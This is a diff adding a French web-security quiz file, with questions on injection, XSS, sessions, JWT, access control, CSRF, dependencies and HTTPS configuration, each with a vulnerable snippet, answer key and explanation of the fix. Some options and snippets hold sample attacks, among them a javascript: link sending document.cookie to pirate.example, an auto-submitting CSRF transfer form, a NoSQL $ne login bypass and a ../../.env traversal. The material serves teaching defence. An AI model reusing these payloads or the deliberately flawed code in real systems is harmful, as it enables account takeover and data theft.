@@ -1,0 +1,331 @@
+import { q } from '../devhub-1';
+import type { QuizQuestion } from '../types';
+
+/** Questions supplémentaires de securite-web (12/11/2026). */
+export const EXTRA: QuizQuestion[] = [
+  // 0 — Injections et XSS
+  q(
+    0,
+    'Le filtre de cette requête est paramétré, mais le tri vient de req.query.sort. Quelle correction est la bonne ?',
+    [
+      'Passer sort en $2, comme la catégorie',
+      'Échapper les apostrophes de sort avant de l’insérer',
+      'Comparer sort à une liste blanche de colonnes autorisées',
+      'Rien : $1 protège déjà toute la requête',
+    ],
+    2,
+    'Un paramètre ($1, $2) transporte une valeur, jamais un nom de colonne ni un mot-clé : ORDER BY $2 trierait sur une constante. Pour un identifiant, on choisit parmi une liste fermée (nom, prix, date) et on refuse le reste.',
+    'const sql = `SELECT id, nom FROM produits\n  WHERE categorie = $1\n  ORDER BY ${req.query.sort}`;\nawait db.query(sql, [req.query.cat]);',
+  ),
+  q(
+    0,
+    'Un profil public est affiché avec ce code. Quelle saisie de l’utilisateur reste dangereuse ?',
+    [
+      'Un nom contenant <script>alert(1)</script>',
+      'Un nom contenant des guillemets',
+      'Un site valant javascript:fetch("https://pirate.example/?c="+document.cookie)',
+      'Aucune : le code n’utilise pas innerHTML',
+    ],
+    2,
+    'textContent affiche le nom comme du texte, donc le <script> est inoffensif. En revanche href accepte le schéma javascript:, exécuté au clic. On n’accepte que les URL en http: ou https:, vérifiées côté serveur et à l’affichage.',
+    "const lien = document.createElement('a');\nlien.href = profil.site;\nlien.textContent = profil.nom;\ncarte.append(lien);",
+  ),
+  q(
+    0,
+    'Le serveur injecte l’état initial dans la page HTML ainsi. Un produit s’appelle </script><script>alert(1)</script>. Que se passe-t-il ?',
+    [
+      'Rien : JSON.stringify échappe tout le HTML',
+      'Le navigateur ferme la balise au premier </script> et exécute le script injecté',
+      'Le JSON est invalide, la page affiche une erreur sans danger',
+      'Le navigateur bloque toujours deux balises script consécutives',
+    ],
+    1,
+    'JSON.stringify produit du JSON valide, pas du HTML sûr : l’analyseur HTML coupe la balise au premier </script>, avant même que JavaScript ne lise la chaîne. On remplace au minimum < par \\u003c (ou on utilise un sérialiseur prévu pour ça).',
+    'res.send(`<script>window.__STATE__ = ${JSON.stringify(state)}</script>`);',
+  ),
+  q(
+    0,
+    'Cette page affiche un message tiré de l’ancre de l’URL (#…). De quel type de faille s’agit-il, et pourquoi un pare-feu applicatif côté serveur ne la voit-il pas ?',
+    [
+      'XSS stockée : le message est enregistré en base',
+      'Injection SQL : le fragment part dans une requête',
+      'XSS réfléchie : le serveur renvoie la saisie dans sa réponse',
+      'XSS basée sur le DOM : le fragment après # n’est jamais envoyé au serveur',
+    ],
+    3,
+    'La source (location.hash) et le point d’exécution (innerHTML) sont tous deux dans le navigateur. Le fragment ne quitte pas le navigateur, donc aucun filtre serveur ne le voit. Correction : textContent, ou nettoyage par liste blanche (DOMPurify) si du HTML est vraiment nécessaire.',
+    "const msg = decodeURIComponent(location.hash.slice(1));\ndocument.getElementById('bandeau').innerHTML = msg;",
+  ),
+  q(
+    0,
+    'Cette connexion avec MongoDB reçoit le corps JSON {"email": "admin@exemple.com", "password": {"$ne": null}}. Que se passe-t-il ?',
+    [
+      'L’attaquant est connecté comme admin : $ne transforme la condition en « mot de passe différent de null »',
+      'MongoDB rejette la requête, car password n’est pas une chaîne',
+      'Rien : MongoDB n’utilise pas SQL, donc aucune injection n’est possible',
+      'La requête renvoie tous les utilisateurs mais la connexion échoue',
+    ],
+    0,
+    'C’est une injection NoSQL : un objet avec un opérateur remplace la valeur attendue. On valide le type de chaque champ (schéma zod ou équivalent), on cherche l’utilisateur par e-mail seulement, puis on compare le mot de passe avec son hachage (argon2, bcrypt).',
+    'const user = await User.findOne({\n  email: req.body.email,\n  password: req.body.password,\n});\nif (user) req.session.userId = user.id;',
+  ),
+
+  // 1 — Authentification et sessions
+  q(
+    1,
+    'À la connexion, ce code garde l’identifiant de session reçu avant l’authentification. Quelle attaque cela permet-il ?',
+    [
+      'Le vol du mot de passe en clair',
+      'La fixation de session : un attaquant qui a imposé l’identifiant à la victime partage sa session une fois qu’elle est connectée',
+      'Une injection SQL dans la table des sessions',
+      'Aucune, tant que le cookie est HttpOnly',
+    ],
+    1,
+    'Il faut émettre un nouvel identifiant au moment où le niveau de privilège change (connexion, élévation) : avec express-session, req.session.regenerate() avant d’y écrire l’utilisateur. HttpOnly empêche la lecture du cookie par JavaScript, pas sa fixation.',
+    "app.post('/login', async (req, res) => {\n  const user = await verifierIdentifiants(req.body);\n  if (!user) return res.status(401).end();\n  req.session.userId = user.id;\n  res.redirect('/tableau');\n});",
+  ),
+  q(
+    1,
+    'Ce middleware lit le rôle dans un JWT. Quel est le problème ?',
+    [
+      'jwt.decode ne vérifie pas la signature : n’importe qui peut fabriquer un jeton avec role: "admin"',
+      'Le rôle ne devrait jamais figurer dans un JWT',
+      'jwt.decode est lent et doit être mis en cache',
+      'Il manque seulement un try/catch autour de jwt.decode',
+    ],
+    0,
+    'decode se contente de lire la charge utile encodée en base64url. Il faut jwt.verify(token, cle, { algorithms: ["HS256"] }) : la signature et l’expiration sont contrôlées, et la liste d’algorithmes ferme la porte à alg: none ou à la confusion RS256/HS256.',
+    "const token = req.headers.authorization?.split(' ')[1];\nconst payload = jwt.decode(token);\nif (payload?.role === 'admin') return next();\nres.status(403).end();",
+  ),
+  q(
+    1,
+    'Une API émet des JWT d’accès valables 30 jours, sans aucun état côté serveur. Un utilisateur dont le téléphone a été volé clique « Me déconnecter partout ». Que se passe-t-il ?',
+    [
+      'Tous les jetons deviennent invalides immédiatement',
+      'Le navigateur supprime les jetons des autres appareils',
+      'Seuls les jetons de plus de 24 h sont invalidés',
+      'Le jeton volé reste accepté jusqu’à son expiration, sauf liste de révocation ou numéro de version vérifié par le serveur',
+    ],
+    3,
+    'Un JWT autonome est valide tant que sa signature et son exp le sont. La pratique courante : jeton d’accès court (5 à 15 min) et jeton de rafraîchissement stocké côté serveur, révocable et renouvelé à chaque usage (rotation).',
+  ),
+  q(
+    1,
+    'Ce jeton sert au lien « mot de passe oublié ». Quelle est la bonne correction ?',
+    [
+      'Allonger le jeton avec un deuxième Math.random()',
+      'Utiliser crypto.randomBytes(32), stocker son hachage en base, avec une expiration courte et un usage unique',
+      'Encoder le jeton en base64 pour le rendre illisible',
+      'Utiliser l’e-mail de l’utilisateur haché en MD5 comme jeton',
+    ],
+    1,
+    'Math.random() n’est pas un générateur cryptographique : sa sortie peut être prédite. Un jeton de réinitialisation équivaut à un mot de passe temporaire : aléa cryptographique, hachage en base (une fuite de la table ne donne pas de liens valides), 15 à 60 min de validité, invalidation après usage.',
+    "const token = Math.random().toString(36).slice(2);\nawait db.query('UPDATE users SET reset_token = $1 WHERE email = $2', [token, email]);",
+  ),
+  q(
+    1,
+    'Avec bcrypt, deux phrases de passe de 80 octets ne diffèrent que par leurs 8 derniers octets. Que se passe-t-il à la connexion ?',
+    [
+      'L’une est acceptée à la place de l’autre : bcrypt n’utilise que les 72 premiers octets',
+      'bcrypt refuse toujours les entrées de plus de 64 octets',
+      'Les deux hachages sont différents, comme pour toute entrée',
+      'bcrypt découpe l’entrée en blocs et hache chaque bloc',
+    ],
+    0,
+    'La plupart des implémentations de bcrypt tronquent silencieusement l’entrée à 72 octets (moins de caractères en UTF-8 accentué). OWASP recommande argon2id pour un nouveau projet ; avec bcrypt, on limite la longueur acceptée ou on documente la troncature.',
+  ),
+
+  // 2 — Contrôle d’accès
+  q(
+    2,
+    'Cette route permet à l’utilisateur de modifier son profil. Il envoie {"nom": "Awa", "role": "admin"}. Que se passe-t-il ?',
+    [
+      'Rien : l’ORM ignore les champs sensibles',
+      'La requête échoue, car role n’est pas modifiable par HTTP',
+      'L’utilisateur devient administrateur : c’est une affectation de masse',
+      'Seul le nom est modifié, car l’utilisateur est authentifié',
+    ],
+    2,
+    'Passer req.body tel quel à l’ORM laisse le client choisir les colonnes modifiées. On construit l’objet à partir d’une liste blanche de champs (nom, bio, ville) validée par un schéma ; role ne se change que par une route réservée aux admins.',
+    "app.patch('/me', requireAuth, async (req, res) => {\n  const user = await User.update(req.user.id, req.body);\n  res.json(user);\n});",
+  ),
+  q(
+    2,
+    'Cette route renvoie une facture. Quelle correction est la plus sûre ?',
+    [
+      'Remplacer les identifiants numériques par des UUID',
+      'Ajouter AND client_id = $2 avec l’identifiant de l’utilisateur connecté, et répondre 404 si aucune ligne',
+      'Cacher le lien vers les factures des autres dans l’interface',
+      'Vérifier que l’en-tête Referer vient bien du site',
+    ],
+    1,
+    'C’est une IDOR : le serveur ne vérifie pas l’appartenance. Les UUID rendent l’identifiant difficile à deviner mais n’autorisent rien : un identifiant qui fuit (lien partagé, journal) suffit. Le filtre dans la requête fait du contrôle d’accès une partie de la lecture elle-même.',
+    "app.get('/factures/:id', requireAuth, async (req, res) => {\n  const { rows } = await db.query('SELECT * FROM factures WHERE id = $1', [req.params.id]);\n  res.json(rows[0]);\n});",
+  ),
+  q(
+    2,
+    'La banque en ligne utilise un cookie de session SameSite=None; Secure. Un site tiers contient ce formulaire, soumis automatiquement à l’ouverture. Pourquoi le virement passe-t-il ?',
+    [
+      'Parce que le site tiers a lu le cookie de session',
+      'Parce que HTTPS n’est pas activé sur la banque',
+      'Parce que le formulaire contourne la vérification du mot de passe',
+      'Parce que le navigateur joint le cookie à la requête intersite et que le serveur ne vérifie ni jeton anti-CSRF ni en-tête Origin',
+    ],
+    3,
+    'C’est une CSRF : l’attaquant ne lit rien, il fait agir le navigateur de la victime. Protections : jeton anti-CSRF lié à la session, vérification de Origin (ou Sec-Fetch-Site), et SameSite=Lax ou Strict, qui bloque l’envoi du cookie sur un POST intersite.',
+    '<form action="https://banque.example/virement" method="POST">\n  <input type="hidden" name="vers" value="FR76-PIRATE" />\n  <input type="hidden" name="montant" value="500000" />\n</form>\n<script>document.forms[0].submit();</script>',
+  ),
+  q(
+    2,
+    'Que permet ce routeur d’administration ?',
+    [
+      'À n’importe qui de supprimer un utilisateur : seule la route GET est protégée',
+      'Rien d’anormal : requireAdmin protège tout le préfixe /admin',
+      'Seulement aux admins de lister et supprimer les utilisateurs',
+      'À un admin de supprimer son propre compte, ce qui est le seul défaut',
+    ],
+    0,
+    'Un middleware passé à une route ne protège que cette route. On refuse par défaut : router.use(requireAdmin) en tête du routeur, pour que chaque nouvelle route soit protégée sans y penser.',
+    "router.get('/admin/users', requireAdmin, listerUtilisateurs);\nrouter.delete('/admin/users/:id', supprimerUtilisateur);",
+  ),
+  q(
+    2,
+    'Cette route sert les pièces jointes. Que renvoie /fichiers?f=../../.env ?',
+    [
+      'Une erreur 404, car .env n’est pas dans uploads',
+      'Le fichier .env de l’application, s’il se trouve deux dossiers plus haut',
+      'Une erreur 400, car path.join refuse les ..',
+      'Le dossier uploads entier',
+    ],
+    1,
+    'path.join normalise les .. au lieu de les refuser : c’est une traversée de répertoire. On résout le chemin (path.resolve) puis on vérifie qu’il commence par le dossier autorisé suivi du séparateur, ou mieux, on sert les fichiers par identifiant stocké en base.',
+    "app.get('/fichiers', requireAuth, (req, res) => {\n  res.sendFile(path.join(__dirname, 'uploads', req.query.f));\n});",
+  ),
+
+  // 3 — Secrets et dépendances
+  q(
+    3,
+    'Le secret scanning de GitHub signale une clé d’API poussée il y a deux jours. Le développeur l’a supprimée dans le commit suivant. Quelle est la première action ?',
+    [
+      'Rien : le commit suivant l’a supprimée',
+      'Rendre le dépôt privé',
+      'Révoquer la clé chez le fournisseur et en émettre une nouvelle',
+      'Réécrire l’historique avec git filter-repo, puis garder la même clé',
+    ],
+    2,
+    'La clé reste dans l’historique Git et a pu être copiée (des robots parcourent GitHub en continu). Seule la révocation la rend inutile. Nettoyer l’historique vient ensuite et ne suffit jamais seul. Pour l’avenir : push protection et secrets dans des variables d’environnement.',
+  ),
+  q(
+    3,
+    'Dans une application React construite avec Vite, quelle variable n’a rien à faire dans le .env du front ?',
+    [
+      'VITE_API_URL=https://api.exemple.com',
+      'VITE_APP_NAME=Boutique',
+      'VITE_PUBLIC_MAPS_KEY=… (clé publique restreinte par domaine)',
+      'VITE_PAYMENT_SECRET_KEY=sk_live_…',
+    ],
+    3,
+    'Toute variable VITE_ est recopiée en clair dans le bundle JavaScript, lisible par n’importe quel visiteur. Une clé secrète (sk_live_) reste côté serveur ; le front appelle l’API, qui appelle le prestataire de paiement.',
+  ),
+  q(
+    3,
+    'Pourquoi utiliser npm ci plutôt que npm install dans la CI ?',
+    [
+      'npm ci installe exactement les versions et empreintes du package-lock.json, et échoue s’il ne correspond pas à package.json',
+      'npm ci met à jour les dépendances vers leurs dernières versions corrigées',
+      'npm ci ignore les devDependencies',
+      'npm ci vérifie les licences des paquets',
+    ],
+    0,
+    'Le lockfile fige l’arbre complet, dépendances transitives comprises, avec un hachage d’intégrité par paquet. La CI teste et déploie ainsi exactement ce qui a été relu, et un paquet modifié sur le registre est détecté.',
+  ),
+  q(
+    3,
+    'npm audit (ou la base OSV) signale une faille critique dans une dépendance transitive. La dépendance directe qui l’embarque n’a pas encore publié de correctif. Que faire ?',
+    [
+      'Lancer npm audit fix --force sans relire le résultat',
+      'Supprimer le package-lock.json pour tout réinstaller',
+      'Forcer la version corrigée de la dépendance transitive avec overrides dans package.json, puis lancer les tests',
+      'Ignorer l’alerte, une dépendance transitive n’est jamais exécutée',
+    ],
+    2,
+    'overrides (resolutions avec Yarn, pnpm.overrides avec pnpm) impose une version précise dans tout l’arbre. --force peut installer des versions majeures cassantes ; supprimer le lockfile rend les builds non reproductibles. On vérifie aussi que le code vulnérable est réellement atteignable.',
+  ),
+  q(
+    3,
+    'Un paquet au nom proche d’une bibliothèque connue contient un script postinstall qui lit ~/.npmrc et les variables d’environnement. Quelle mesure bloque ce comportement à l’installation ?',
+    [
+      'Lancer npm audit après l’installation',
+      'Désactiver les scripts de cycle de vie (ignore-scripts=true, ou la liste d’autorisation de pnpm) et n’autoriser que les paquets connus',
+      'Installer le paquet en devDependency',
+      'Épingler la version exacte du paquet',
+    ],
+    1,
+    'Le script s’exécute pendant l’installation, avant tout audit, et un paquet de typosquatting n’a souvent aucune faille connue. pnpm 10 n’exécute plus les scripts des dépendances par défaut ; avec npm on pose ignore-scripts=true. Et on vérifie le nom exact avant d’installer.',
+  ),
+
+  // 4 — Configuration et HTTPS
+  q(
+    4,
+    'Le site a renvoyé cet en-tête lors d’une visite précédente. Dans un café, l’utilisateur tape http://exemple.com. Que fait le navigateur ?',
+    [
+      'Il envoie la requête en HTTP, puis suit la redirection 301 du serveur',
+      'Il affiche un avertissement et laisse l’utilisateur choisir',
+      'Il bloque le site pendant un an',
+      'Il passe lui-même en HTTPS avant d’envoyer quoi que ce soit, ce qui empêche un attaquant du réseau de rester en HTTP',
+    ],
+    3,
+    'HSTS mémorise pour max-age secondes que le domaine (et ses sous-domaines avec includeSubDomains) n’existe qu’en HTTPS, et interdit de passer outre une erreur de certificat. La toute première visite reste exposée, sauf si le domaine est inscrit dans la liste de préchargement (preload).',
+    'Strict-Transport-Security: max-age=31536000; includeSubDomains',
+  ),
+  q(
+    4,
+    'Pourquoi cette CSP protège-t-elle peu contre une XSS ?',
+    [
+      "Parce que 'self' autorise tous les domaines",
+      "Parce que 'unsafe-inline' laisse s’exécuter un <script> injecté dans la page et les attributs onclick",
+      'Parce qu’il manque default-src, ce qui désactive la CSP',
+      'Parce qu’une CSP ne concerne que les images',
+    ],
+    1,
+    "La plupart des XSS injectent du script en ligne : 'unsafe-inline' l’autorise. On sort les scripts dans des fichiers, ou on marque les scripts légitimes avec un nonce aléatoire par réponse (ou un hash), éventuellement avec 'strict-dynamic'.",
+    "Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'",
+  ),
+  q(
+    4,
+    'Cette API renvoie les en-têtes CORS ainsi. Quel est le risque ?',
+    [
+      'Aucun : CORS est une protection, plus il est permissif, mieux c’est',
+      'L’API devient inaccessible depuis le front officiel',
+      'N’importe quel site peut lire les réponses authentifiées de l’API avec les cookies de la victime',
+      'Les requêtes GET sont bloquées',
+    ],
+    2,
+    'Renvoyer l’Origin reçu revient à faire confiance à tout le web, avec les cookies en plus. Le navigateur refuse justement « * » avec credentials pour cette raison. On compare l’origine à une liste fixe de domaines autorisés et on ajoute Vary: Origin.',
+    "res.setHeader('Access-Control-Allow-Origin', req.headers.origin);\nres.setHeader('Access-Control-Allow-Credentials', 'true');",
+  ),
+  q(
+    4,
+    'Quelle configuration TLS est recommandée aujourd’hui pour un site public ?',
+    [
+      'SSLv3 à TLS 1.3, pour rester compatible avec tous les clients',
+      'TLS 1.0 et versions suivantes',
+      'TLS 1.1 uniquement',
+      'TLS 1.2 et 1.3, avec TLS 1.0 et 1.1 désactivés',
+    ],
+    3,
+    'TLS 1.0 et 1.1 sont officiellement dépréciés (RFC 8996) et SSLv3 est cassé (POODLE). TLS 1.2 avec des suites AEAD (AES-GCM, ChaCha20-Poly1305) et TLS 1.3 couvrent la quasi-totalité des clients actuels.',
+  ),
+  q(
+    4,
+    'En production, une erreur 500 renvoie au navigateur la pile d’appels et la requête SQL fautive. Quelle est la bonne pratique ?',
+    [
+      'Garder ces détails : ils aident les utilisateurs à signaler le bug',
+      'Renvoyer un message générique avec un identifiant d’incident, et écrire le détail dans les journaux serveur',
+      'Renvoyer un code 200 pour masquer l’erreur',
+      'Chiffrer la pile d’appels dans la réponse',
+    ],
+    1,
+    'La pile révèle chemins, versions, noms de tables et parfois des données : de quoi préparer une attaque (OWASP « mauvaise configuration de sécurité »). L’identifiant d’incident permet au support de retrouver l’entrée dans les journaux. Avec Express, NODE_ENV=production masque déjà la pile du gestionnaire par défaut.',
+  ),
+];
